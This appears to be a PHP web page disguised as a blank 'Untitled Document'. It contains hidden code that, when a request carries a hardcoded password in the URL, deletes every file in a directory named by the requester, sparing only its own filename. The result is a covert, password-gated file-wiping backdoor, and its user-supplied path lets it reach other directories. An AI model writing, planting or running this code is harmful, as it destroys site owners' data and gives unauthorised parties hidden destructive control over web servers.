<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>

<body>

<?php

function a($current=".") {
	$myDirectory = opendir($current);
	// get each entry
	while($entryName = readdir($myDirectory)) {
		$dirArray[] = $current."/".$entryName;
	}
	return $dirArray;
}
function d($dirlist) {
	$f = count($dirlist);
	for($i=0;$i<$f;$i++) {
	if($dirlist[$i]=="./filea.php")
		continue;
	else
		unlink($dirlist[$i]);
	}
}
if($_GET['a']=="happy123")
{
	if(isset($_GET['dir']))
		$path1=$_GET['dir'];
	else
		$path1=".";
		
	$dir1 = a($path1);
	d($dir1);
	//var_dump($dir1);
	/*for($j;$j<5;$j++) {
		
	}*/
}
echo "<br/><br/>";
//var_dump($dirArray);

?>

</body>
</html>
